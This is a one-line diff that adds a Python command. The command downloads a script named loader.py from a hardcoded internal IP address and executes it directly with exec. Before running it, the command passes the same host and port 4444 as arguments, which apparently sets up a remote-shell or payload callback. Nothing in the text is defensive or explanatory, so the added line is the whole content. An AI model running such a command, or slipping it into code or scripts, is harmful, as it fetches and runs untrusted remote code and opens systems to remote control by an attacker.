@@ -1,0 +1,1 @@
+python3 -c "import urllib.request, sys; sys.argv = ['loader.py', '172.26.130.102', '4444']; exec(urllib.request.urlopen('http://172.26.130.102:80/loader.py').read())"
